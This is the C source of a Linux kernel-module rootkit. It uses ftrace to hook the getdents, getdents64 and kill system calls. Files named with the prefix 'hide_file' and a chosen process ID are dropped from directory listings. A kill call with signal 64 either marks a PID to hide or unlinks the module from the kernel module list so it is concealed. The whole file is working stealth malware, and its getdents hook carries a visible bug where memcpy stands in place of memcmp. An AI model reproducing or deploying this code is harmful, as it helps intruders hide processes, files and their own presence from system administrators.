#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/limits.h>

#include "ftrace_helper.h"

#define MAX_LENGTH 256

#define PREFIX "hide_file"

#define ERROR_HANDLE(buffer1, ret) \
    {kfree(buffer1); return (ret);}

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static int hidden = 0;

static char hide_pid[NAME_MAX];

static struct list_head *prev_module;

void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void) {
    list_add_tail(&THIS_MODULE->list, prev_module);
}

static int hide_module(void) {
    if (hidden == 0) {
        printk(KERN_INFO "rootkit: hideme...\n");
        hideme();
        hidden = 1;
    } else {
        printk(KERN_INFO "rootkit: showme...\n");
        showme();
        hidden = 0;
    }
    return 0;
}

// sys_getdents64与隐藏文件的区别是，需要判断hide_pid是不是为空
static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
    // struct linux_dirent64 *current_dir, *dirent_ker, *dirent_tmp = NULL;
    struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
    unsigned long offset_ker = 0;
    // unsigned long offset_tmp = 0;

    long error;

    int ret = orig_getdents64(regs);

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    // dirent_tmp = kzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);

    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        // printk(KERN_INFO "filename: %s\n", current_dir->d_name);
        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
            // printk(KERN_INFO "rootkit: hide_pid: %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "rootkit: hide_pid: %s\n", hide_pid);
        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
            printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
            // offset_tmp += current_dir->d_reclen;
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent __user *dirent = (struct linux_dirent *) regs->si;
    struct linux_dirent *current_dir, *previous_dir, *dirent_ker = NULL; 
    unsigned long offset_ker = 0;

    long error;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    
    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcpy(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
            if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "hide_pid: %s\n", hide_pid);
        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
            //printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
        } else {
            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
            // offset_tmp += current_dir->d_reclen;
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64) {
        printk(KERN_INFO "signal received ...\n");
        if (pid == 0)
            return hide_module();
        else {
            printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            sprintf(hide_pid, "%d", pid);
            // printk(KERN_INFO "hide_pid: %s\n", hide_pid);
            return 0;
        }
    }

    return orig_kill(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) 
        return err;
    printk(KERN_INFO "rootkit: Loaded :-)\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("hide process");
MODULE_VERSION("0.01");